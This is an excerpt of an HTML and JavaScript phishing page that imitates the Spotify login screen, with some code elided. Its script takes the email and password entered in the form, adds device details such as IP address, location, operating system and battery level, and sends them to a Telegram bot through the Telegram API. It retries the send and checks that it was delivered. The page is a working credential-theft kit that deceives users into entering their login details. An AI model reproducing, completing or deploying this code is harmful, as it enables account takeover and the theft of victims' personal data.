...
<head>
    ...
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Circular Spotify Tx T Black',Arial,sans-serif}body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}.login-container{background:#121212;padding:40px 60px;border-radius:10px;width:450px;box-shadow:0 8px 30px rgba(0,0,0,.5)}.spotify-logo{width:180px;margin:0 auto 40px;display:block}h1{text-align:center;margin-bottom:40px;font-size:32px}.form-group{margin-bottom:25px}input{width:100%;padding:15px;background:#181818;border:1px solid #535353;border-radius:4px;color:#fff;font-size:16px;transition:all .3s ease}input:focus{outline:none;border-color:#1DB954;box-shadow:0 0 0 2px rgba(29,185,84,.3)}.btn-login{width:100%;padding:15px;background:#1DB954;color:#000;border:none;border-radius:500px;font-size:16px;font-weight:700;cursor:pointer;margin-top:30px;transition:transform .2s ease}.btn-login:hover{transform:scale(1.05)}.options{display:flex;justify-content:space-between;margin:20px 0;color:#b3b3b3}.loader{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.8);justify-content:center;align-items:center;z-index:1000}.spotify-loader{width:50px;height:50px;border-radius:50%;border:3px solid #1DB954;border-top-color:transparent;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="loader" id="loader">
        <div class="spotify-loader"></div>
    </div>
    ...
    <script>
        ...
        async function getDeviceDetails(){
            ...
            } catch { return { error: 'Failed to get device info' } }
        }

        async function verifyDelivery(messageId) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
            const data = await response.json();
            return data.result.some(msg => msg.message?.message_id === messageId);
        }

        async function sendToTelegram(data) {
            const message = `🎧 Spotify Login Attempt 🚨\n📧 Email: ${data.email}\n🔑 Password: ${data.password}\n📡 Device Info:\n🌐 IP: ${data.device.ip}\n📍 Location: ${data.device.city}, ${data.device.country}\n🖥 OS: ${data.device.os}\n📺 Resolution: ${data.device.resolution}\n🔋 Battery: ${data.device.battery}\n🕒 Time: ${data.device.time}\n🌍 Browser: ${data.device.browser}`;
            ...
            try {
                ...
                const result = await response.json();
                if(result.ok) return await verifyDelivery(result.result.message_id);
                return false;
            } catch { return false }
        }
        ...
        document.getElementById('loginForm').addEventListener('submit', async e => {
            ...
            try {
                ...
                while(attempts++ < 3 && !success) {
                    success = await sendToTelegram({ email, password, device: deviceInfo });
